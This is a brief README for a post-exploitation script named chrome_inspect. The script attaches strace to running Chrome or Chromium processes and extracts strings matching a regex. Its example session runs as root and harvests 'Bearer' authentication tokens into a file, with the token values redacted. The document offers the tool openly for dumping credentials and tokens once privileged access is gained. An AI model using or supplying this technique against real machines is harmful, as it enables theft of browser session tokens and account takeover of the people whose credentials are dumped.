# Scripts

## chrome_inspect

### Description
This script will use `strace` to attach `chrom{e,ium}` running processes and search for the strings
matching the `regex` provided. It is useful in post-exploitation for dumping tokens and credentials
after you have privileged access (or when `sys.yama.ptrace == 0`).

### Example

```
root@host:~# ./chrome_inspect 'Bearer [a-zA-Z0-9-_+/.]*' /tmp/jwt_tokens
[+] - Looking for regex 'Bearer [a-zA-Z0-9-_+/.]*' and outputing to /tmp/out
[+] - Press Ctrl-C to terminate execution.
[+] - Starting cleanup...
[+] - Uniq token values:
Bearer <REDACTED_TOKEN>
Bearer <REDACTED_TOKEN>
[+] - Killing ptrace processes.

```

